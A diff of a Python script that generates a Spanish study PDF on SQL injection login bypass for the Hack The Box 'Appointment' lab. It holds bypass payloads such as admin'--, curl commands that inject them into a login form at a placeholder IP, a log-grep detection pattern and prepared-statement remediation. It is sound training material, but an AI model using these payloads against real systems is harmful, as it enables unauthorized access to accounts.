@@ -6,10 +6,13 @@ RedTeamLab · César Contreras · CPTS 2026
 """
 
 import sys, os
-sys.path.insert(0, os.path.dirname(__file__))
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from pdf_base import *
 
-OUTPUT = r"C:\RedTeamLab\HTB\Appointment\Teoria_SQLi_LoginBypass.pdf"
+OUTPUT = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)),
+    "..", "HTB", "Appointment", "Teoria_SQLi_LoginBypass.pdf"
+)
 
 S   = make_styles()
 doc = make_doc(OUTPUT)
@@ -42,9 +45,7 @@ data = [
     ["Herramientas",  "nmap, curl, gobuster, Burp Suite"],
     ["Vector",        "Formulario de login vulnerable a SQLi clásica sin WAF"],
 ]
-t = Table(data, colWidths=[5.2*cm, 10.8*cm])
-t.setStyle(table_style_base())
-story.append(t)
+story.append(make_table(data, [CONTENT_W*0.28, CONTENT_W*0.72], S))
 story.append(Spacer(1, 0.4*cm))
 
 story.append(Paragraph(
@@ -60,7 +61,6 @@ story.append(Paragraph(
 ))
 
 # ── 2. SQL Injection — Fundamentos ───────────────────────────────────────────
-story.append(PageBreak())
 story.append(Paragraph("2. SQL Injection — Fundamentos", S["h1"]))
 story.append(hr())
 
@@ -73,7 +73,7 @@ story.append(Paragraph(
 ))
 
 story.append(Paragraph("Query vulnerable típica en un login:", S["h3"]))
-for line in [
+add_code_block(story, S, [
     '-- Código PHP vulnerable (backend)',
     '$query = "SELECT * FROM users WHERE username=\'".$_POST["user"]."\' AND password=\'".$_POST["pass"]."\';";',
     '',
@@ -83,8 +83,7 @@ for line in [
     '-- Con payload SQLi: usuario = admin\'--',
     "SELECT * FROM users WHERE username='admin'--' AND password='cualquier';",
     '                                              ^^^ comentario SQL: ignora el resto',
-]:
-    story.append(Preformatted(line, S["code"]))
+])
 
 story.append(Paragraph(
     "El doble guión <b>--</b> es el operador de comentario en SQL (MySQL también acepta <b>#</b>). "
@@ -103,14 +102,13 @@ story.append(Paragraph(
 data2 = [
     ["Payload (campo usuario)", "Lógica resultante", "Cuándo funciona"],
     ["admin'--",                "Ignora password check",          "Username conocido (admin)"],
-    ["' OR '1'='1'--",         "Siempre TRUE — primer registro", "Sin conocer username"],
-    ["' OR 1=1#",              "Igual, con comentario MySQL #",   "MySQL/MariaDB"],
-    ["admin' #",               "Ignora password — MySQL",         "Username conocido, MySQL"],
-    ["') OR ('1'='1",          "Con paréntesis — sintaxis alternativa", "Queries con paréntesis"],
+    ["' OR '1'='1'--",          "Siempre TRUE — primer registro", "Sin conocer username"],
+    ["' OR 1=1#",               "Igual, con comentario MySQL #",  "MySQL/MariaDB"],
+    ["admin' #",                "Ignora password — MySQL",        "Username conocido, MySQL"],
+    ["') OR ('1'='1",           "Con paréntesis — sintaxis alternativa", "Queries con paréntesis"],
 ]
-t2 = Table(data2, colWidths=[5*cm, 5.5*cm, 5.5*cm])
-t2.setStyle(table_style_base())
-story.append(t2)
+story.append(make_table(data2, [CONTENT_W*0.32, CONTENT_W*0.34, CONTENT_W*0.34], S,
+                         mono_cols={0}))
 story.append(Spacer(1, 0.3*cm))
 
 story.append(Paragraph(
@@ -120,7 +118,7 @@ story.append(Paragraph(
 ))
 
 story.append(Paragraph("2.3 Anatomía del Bypass — Paso a Paso", S["h2"]))
-for line in [
+add_code_block(story, S, [
     "-- Input del atacante:",
     "  username: admin'--",
     "  password: cualquier_cosa",
@@ -131,24 +129,21 @@ for line in [
     "-- Lo que ejecuta el motor SQL:",
     "  SELECT * FROM users WHERE username='admin'",
     "  --> Devuelve fila de admin --> login exitoso",
-]:
-    story.append(Preformatted(line, S["code"]))
+])
 
 # ── 3. Reconocimiento Pre-Explotación ────────────────────────────────────────
-story.append(PageBreak())
 story.append(Paragraph("3. Reconocimiento Pre-Explotación", S["h1"]))
 story.append(hr())
 
 story.append(Paragraph("3.1 Nmap — Identificar Servicios Web", S["h2"]))
-for line in [
+add_code_block(story, S, [
     "nmap -sCV -p- --min-rate 5000 <IP> -oN nmap_appointment.txt",
     "",
     "# Qué buscar en output:",
     "# 80/tcp  open  http   Apache httpd X.X",
     "# 443/tcp open  https  (si existe)",
     "# → Si hay 80/443, hay aplicación web que enumerar",
-]:
-    story.append(Preformatted(line, S["code"]))
+])
 
 story.append(Paragraph("3.2 Gobuster — Descubrir Directorios", S["h2"]))
 story.append(Paragraph(
@@ -156,7 +151,7 @@ story.append(Paragraph(
     "Gobuster realiza fuzzing de directorios/archivos por fuerza bruta.",
     S["body"]
 ))
-for line in [
+add_code_block(story, S, [
     "gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html",
     "",
     "# Flags importantes:",
@@ -168,8 +163,7 @@ for line in [
     "# /login.php    (Status: 200)",
     "# /admin/       (Status: 301 o 403)",
     "# /index.php    (Status: 200)",
-]:
-    story.append(Preformatted(line, S["code"]))
+])
 
 story.append(Paragraph("3.3 Inspección del Formulario de Login", S["h2"]))
 story.append(Paragraph(
@@ -177,7 +171,7 @@ story.append(Paragraph(
     "método HTTP (GET/POST), nombres de campos (name=), acción (action=).",
     S["body"]
 ))
-for line in [
+add_code_block(story, S, [
     "# Ver source HTML del formulario:",
     "curl -s http://<IP>/login.php | grep -A 20 '<form'",
     "",
@@ -188,16 +182,14 @@ for line in [
     "",
     "# Con Burp Suite:",
     "# Interceptar el POST de login → ver raw request → modificar parámetros",
-]:
-    story.append(Preformatted(line, S["code"]))
+])
 
 # ── 4. Explotación — Login Bypass ────────────────────────────────────────────
-story.append(PageBreak())
 story.append(Paragraph("4. Explotación — Login Bypass", S["h1"]))
 story.append(hr())
 
 story.append(Paragraph("4.1 Probar Manualmente con curl", S["h2"]))
-for line in [
+add_code_block(story, S, [
     "# POST con payload SQLi en username:",
     "curl -s -X POST http://<IP>/login.php \\",
     "  -d \"username=admin'--&password=test\" \\",
@@ -212,8 +204,7 @@ for line in [
     "# - Redirección a /dashboard.php o /home.php",
     "# - Desaparece el formulario de login",
     "# - Aparece texto 'Welcome' o 'Logged in'",
-]:
-    story.append(Preformatted(line, S["code"]))
+])
 
 story.append(Paragraph("4.2 Usando Burp Suite (método recomendado)", S["h2"]))
 story.append(Paragraph(
@@ -247,16 +238,14 @@ story.append(Paragraph(
     "pero en Tier 1 generalmente está en la respuesta HTTP inmediata.",
     S["body"]
 ))
-for line in [
+add_code_block(story, S, [
     "# Si el bypass funciona, buscar en el HTML de respuesta:",
     "curl -s -X POST http://<IP>/login.php \\",
     "  -d \"username=admin'--&password=x\" -L | grep -i 'flag\\|HTB{'",
-]:
-    story.append(Preformatted(line, S["code"]))
+])
 
 # ── 5. MITRE ATT&CK ──────────────────────────────────────────────────────────
-story.append(PageBreak())
-story.append(Paragraph("5. MITRE ATT&CK — Mapeo de la Técnica", S["h1"]))
+story.append(Paragraph("5. MITRE ATT&amp;CK — Mapeo de la Técnica", S["h1"]))
 story.append(hr())
 
 data3 = [
@@ -270,9 +259,11 @@ data3 = [
     ["Defense Evasion", "Exploitation for Defense Evasion", "T1211", "—",
      "Comentario SQL (--) para ignorar validación de password"],
 ]
-t3 = Table(data3, colWidths=[3*cm, 4*cm, 2*cm, 2.5*cm, 4.5*cm])
-t3.setStyle(table_style_base())
-story.append(t3)
+story.append(make_table(
+    data3,
+    [CONTENT_W*0.16, CONTENT_W*0.24, CONTENT_W*0.10, CONTENT_W*0.14, CONTENT_W*0.36],
+    S
+))
 story.append(Spacer(1, 0.3*cm))
 
 story.append(Paragraph(
@@ -287,7 +278,7 @@ story.append(Paragraph("6. Blue Team — ¿Qué se Detecta?", S["h1"]))
 story.append(hr())
 
 story.append(Paragraph("6.1 Indicadores en Logs del Servidor Web", S["h2"]))
-for line in [
+add_code_block(story, S, [
     "# Apache/Nginx access.log — buscar payloads SQLi en requests:",
     "POST /login.php HTTP/1.1",
     'Body: username=admin\'--&password=test',
@@ -300,8 +291,7 @@ for line in [
     "",
     "# Grep rápido en logs para detectar intentos:",
     "grep -E \"('|--|%27|%2D%2D|OR+1|UNION)\" /var/log/apache2/access.log",
-]:
-    story.append(Preformatted(line, S["code"]))
+])
 
 story.append(Paragraph("6.2 Indicadores en SIEM / IDS", S["h2"]))
 detection_items = [
@@ -314,7 +304,7 @@ for item in detection_items:
     story.append(Paragraph(f"• {item}", S["bullet"]))
 story.append(Spacer(1, 0.3*cm))
 
-story.append(Paragraph("6.3 Conexión con Threat Hunting (ramo actual)", S["h2"]))
+story.append(Paragraph("6.3 Perspectiva Threat Hunter", S["h2"]))
 story.append(Paragraph(
     "Desde la perspectiva ofensiva: un atacante que usa SQLi manual (sin sqlmap) "
     "genera MENOS ruido — sqlmap hace cientos de requests automatizados que disparan "
@@ -330,7 +320,6 @@ story.append(Paragraph(
 ))
 
 # ── 7. Remediación ───────────────────────────────────────────────────────────
-story.append(PageBreak())
 story.append(Paragraph("7. Remediación — Cómo se Parchea", S["h1"]))
 story.append(hr())
 
@@ -341,7 +330,7 @@ story.append(Paragraph(
 ))
 
 story.append(Paragraph("7.1 Prepared Statements (fix principal)", S["h2"]))
-for line in [
+add_code_block(story, S, [
     "-- VULNERABLE (concatenación directa):",
     '$query = "SELECT * FROM users WHERE username=\'".$user."\' AND password=\'".$pass."\';";',
     "",
@@ -353,8 +342,7 @@ for line in [
     '$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");',
     '$stmt->bind_param("ss", $user, $pass);',
     '$stmt->execute();',
-]:
-    story.append(Preformatted(line, S["code"]))
+])
 
 story.append(Paragraph(
     "Los prepared statements separan el código SQL del dato. El motor SQL procesa "
@@ -376,12 +364,11 @@ for m in mitigations:
     story.append(Paragraph(f"• {m}", S["bullet"]))
 
 # ── 8. Cheatsheet Rápida ─────────────────────────────────────────────────────
-story.append(PageBreak())
 story.append(Paragraph("8. Cheatsheet — Appointment", S["h1"]))
 story.append(hr())
 
 story.append(Paragraph("Flujo de ataque completo:", S["h2"]))
-for line in [
+add_code_block(story, S, [
     "# 1. Reconocimiento",
     "nmap -sCV -p- --min-rate 5000 <IP> -oN nmap.txt",
     "",
@@ -401,8 +388,7 @@ for line in [
     "",
     "# 6. Extraer flag de respuesta",
     "curl -s -X POST http://<IP>/login.php -d \"username=admin'--&password=x\" -L | grep -oE 'HTB\\{[^}]+\\}'",
-]:
-    story.append(Preformatted(line, S["code"]))
+])
 
 story.append(Spacer(1, 0.3*cm))
 story.append(Paragraph("Operadores SQL útiles para bypass:", S["h2"]))
@@ -412,13 +398,12 @@ data4 = [
     ["#",               "MySQL, MariaDB",       "Comentario alternativo MySQL"],
     ["/* */",           "Todos",                "Comentario de bloque"],
     ["OR 1=1",          "Todos",                "Condición siempre verdadera"],
-    ["' OR 'x'='x",    "Todos",                "Condición verdadera sin OR numérico"],
+    ["' OR 'x'='x",     "Todos",                "Condición verdadera sin OR numérico"],
     ["SLEEP(5)",        "MySQL",                "Blind SQLi — delay para confirmar inyección"],
     ["WAITFOR DELAY",   "MSSQL",                "Equivalente a SLEEP en SQL Server"],
 ]
-t4 = Table(data4, colWidths=[4.5*cm, 4.5*cm, 7*cm])
-t4.setStyle(table_style_base())
-story.append(t4)
+story.append(make_table(data4, [CONTENT_W*0.30, CONTENT_W*0.28, CONTENT_W*0.42], S,
+                         mono_cols={0}))
 
 # ── 9. Conexión CPTS ─────────────────────────────────────────────────────────
 story.append(Spacer(1, 0.5*cm))
